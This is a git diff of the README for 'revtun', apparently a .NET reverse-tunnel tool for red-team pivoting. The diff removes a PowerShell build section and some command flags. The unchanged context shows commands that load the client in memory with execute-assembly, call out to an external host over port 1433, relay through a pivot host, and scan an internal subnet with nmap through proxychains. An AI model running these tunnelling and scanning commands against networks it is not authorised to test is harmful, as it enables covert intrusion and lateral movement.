@@ -26,14 +26,6 @@ dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:Publis
 dotnet build -c Release -f net48 -p:Platform=AnyCPU
 ```
 
-### Build (Multi-Platform)
-Use the provided PowerShell script for automated builds:
-
-```powershell
-# Builds all targets: .NET Framework 4.8, Linux x64, Windows x64
-.\build-multi.ps1
-```
-
 ## Usage
 
 ### Server
@@ -62,10 +54,10 @@ proxychains nmap -sT 192.168.1.0/24
 ### Deployment
 ```bash
 # Client from internal network  
-execute-assembly revtun.exe client --host [external-ip] --port 1433 --encrypt --auto-exit
+execute-assembly revtun.exe client --host [external-ip] --port 1433 --encrypt
 
 # Relay on pivot host
-execute-assembly revtun.exe relay --host [internal-sql-server] --port 1433 --verbose
+execute-assembly revtun.exe relay --host [internal-sql-server] --port 1433
 ```
 
 ## Command Options
